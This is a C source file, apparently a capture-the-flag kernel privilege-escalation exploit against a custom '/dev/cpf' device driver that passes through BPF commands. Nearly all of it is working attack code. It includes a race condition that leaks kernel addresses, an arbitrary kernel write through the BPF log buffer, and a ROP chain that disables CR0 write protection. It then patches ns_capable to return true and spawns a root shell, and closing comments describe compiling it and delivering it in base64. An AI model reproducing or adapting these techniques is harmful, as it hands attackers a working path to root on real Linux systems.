#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>
#include <errno.h>
#include <sys/file.h>

#define __aligned_u64 __u64 __attribute__((aligned(8)))
#include <linux/bpf.h>

#define LOAD_ATTR 0
#define DUMP_ATTR 1
#define MAP_CREATE 12
#define MAP_LOOKUP_ELEM 3
#define MAP_UPDATE_ELEM 4
#define MAP_DELETE_ELEM 5
#define MAP_GET_NEXT_KEY 6
#define PROG_LOAD 7
#define OBJ_PIN 8
#define OBJ_GET 9
#define PROG_GET_FD_BY_ID 10
#define MAP_GET_FD_BY_ID 11

#define CR0_WP (1 << 16)


struct cpf_data {
    unsigned char attr[48];
    unsigned char extra[128];
};

struct tmp {
    unsigned long ptr;
    unsigned long value;
};

void hexdump(unsigned char *p, int n) {
    for (int i = 0; i < n; ++i) {
        if (i % 8 == 0)
            printf("\n");
        printf("%02x", p[i]);
    }
    printf("\n");
}

void kwrite(unsigned long addr, unsigned long value) {
    int fd = open("/dev/cpf", 2);
    struct cpf_data buf;
    unsigned long prog[] = {
        value,
        0,
        0,
        0
    };
	size_t insns_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    union bpf_attr battr = {
            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
            .insns = prog,
            .insn_cnt = insns_cnt,
            .license = "N/A",
            .log_level = 9,
            .log_size = 128,
            .log_buf = addr,
            .kern_version = 0,
    };
    memset(&buf, 0, sizeof(buf));
    memcpy(&buf,&battr,48);
    ioctl(fd,0,&buf);
    ioctl(fd,PROG_LOAD,&buf);
    close(fd);
}

char *race_mem;
#define STACK_SIZE (1024 * 1024)
volatile int race_run = 1;
char race_thread_stack[STACK_SIZE];
static int *race(void *arg) {
    while (race_run) {
        mprotect(0x100000, 0x1000, PROT_READ);
        usleep(1);
        mprotect(0x100000, 0x1000, PROT_NONE);
        usleep(1);
    }
}

unsigned long kernel_base;
unsigned long kstack_addr;
void leak_addresses() {
    int fd;
    struct cpf_data buf,buf2;
    struct cpf_data fail_result;
    char *race_mem_tail;
    int ret,value,key=2;

    fd = open("/dev/cpf", 2);
    union bpf_attr battr = {
            .map_type = BPF_MAP_TYPE_ARRAY,
            .key_size = sizeof(int),
            .value_size = sizeof(long long),
            .max_entries = 3
    };
    memcpy(&buf2,&battr,48);
    ret=ioctl(fd,0,&buf2);
    //printf("%d\n",ret);
    ret=ioctl(fd, 12 ,0);

    race_mem = (char *)mmap((void *)0x100000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    mmap((void *)(race_mem + 0x1000), 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    race_mem_tail = race_mem + 0xfff;

    union bpf_attr battr2 = {
            .map_fd = 4,
            .key=&key,
            .value=&value
    };


    memcpy(race_mem_tail, &battr2 ,sizeof(union bpf_attr));
    clone(race, race_thread_stack + STACK_SIZE, CLONE_VM, NULL);

    memcpy(&buf, &battr2, sizeof(union bpf_attr));
    memcpy(&fail_result,&buf,sizeof(buf));
    //memset(&fail_result, 0x42, sizeof(fail_result));

    printf("%d\n",ret);

    memcpy(&buf2,&battr2,48);


    while (1) {
        //ret=ioctl(fd,0,&buf2);
        ret=ioctl(fd,MAP_LOOKUP_ELEM,0);
        //printf("%d",value);
        //sleep(5);

        // load
        ret = ioctl(fd, 0, race_mem_tail);

        if (ret == -1 && (errno == 14 || errno == -14)) {
            // dump
            if (!ioctl(fd, 1, &buf)) {
                if (memcmp(&buf, &fail_result, sizeof(buf))&&memcmp(&buf,&battr2,48)) {
                    puts("leak success?");
                    hexdump(&buf, sizeof(buf));
                    kernel_base = *(unsigned long *)(&buf.attr[24]) - 0x21ca95;
                    kstack_addr = *(unsigned long *)(&buf.attr[160]);

                    if (!kstack_addr)
                        continue;

                    break;
                }
            }
        }
    }

    race_run = 0;

    close(fd);
}

int lock_fd1;
int lock_fd2;
unsigned long kwrite_rop_addr;
unsigned long kwrite_rop_value;

char overwrite_stack_thread_stack[STACK_SIZE];
static int *overwrite_stack(void *arg) {
    printf("overwrite_stack pid: %d\n", getpid());
    printf("overwrite_stack flock(LOCK_EX): %d\n", flock(lock_fd1, LOCK_EX));

    const unsigned long base_index = 20;

    unsigned long payload[] = {
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,
        kernel_base + 0x613DA,

        // pop rdi
        kernel_base + 0xFC18,
        0x0000000080050033 & ~CR0_WP,
        // native_write_cr0
        kernel_base + 0x62480,
        
        // pop rdi
        kernel_base + 0xFC18,
        (kwrite_rop_addr & 0xfffffffffffff000) - 0x1000,
        // pop rsi
        kernel_base + 0x310C,
        3,
        // set_memory_rw
        kernel_base + 0x6DF00,

        // pop rdi
        kernel_base + 0xFC18,
        kwrite_rop_addr,
        // pop rsi
        kernel_base + 0x310C,
        kwrite_rop_value,
        // mov [rdi], rsi
        kernel_base + 0x625A0,

        // crash to user
        kernel_base + 0xA00000,
        0
    };
        
    sleep(2);

    for(int i = base_index; i < base_index + sizeof(payload) / sizeof(unsigned long); i++) {
        kwrite(kstack_addr + i * 8, payload[i - base_index]);
    }

    printf("overwrite_stack flock(LOCK_UN): %d\n", flock(lock_fd1, LOCK_UN));
}

void kwrite_rop(unsigned long addr, unsigned long value) {
    if (!fork()) {
        signal(SIGCHLD, SIG_IGN);
        sleep(3);
    }
    else {
        kwrite_rop_addr = addr;
        kwrite_rop_value = value;

        lock_fd1 = open("/tmp/lock", O_WRONLY|O_CREAT|O_TRUNC, 0777);
        lock_fd2 = open("/tmp/lock", 0);

        printf("lock_fd1: %d\n", lock_fd1);
        printf("lock_fd2: %d\n", lock_fd2);
        printf("victim pid: %d\n", getpid());

        clone(overwrite_stack, overwrite_stack_thread_stack + STACK_SIZE, CLONE_VM, NULL);
        sleep(1);
        printf("flock: %d\n", flock(lock_fd2, LOCK_EX));
        exit(0);
    }
}

void exploit() {
    if (!fork()) {
        leak_addresses();

        unsigned long ns_capable = kernel_base + 0x8A890;
        printf("kernel base: %p\n", kernel_base);
        printf("ns_capable: %p\n", ns_capable);
        printf("kstack addr: %p\n", kstack_addr);

        // ns_capable { return 1; }
        kwrite_rop(ns_capable, 0xc3c0fec03148);
        exit(0);
    }
    else {
        while (setuid(0))
            sleep(1);
        setreuid(0, 0);
        setregid(0, 0);
        char *args[] = {"/bin/sh", NULL};
        execve(args[0], args, NULL);
    }
}

// diet gcc -static -s exploit.c -o exploit
// base64 exploit

// cat > /tmp/a << EOF
// ...
// EOF
//
// base64 -d /tmp/a > /tmp/b
// chmod 777 /tmp/b
// /tmp/b
int main(int argc, char *argv[]) {
    exploit();
    return 0;
}
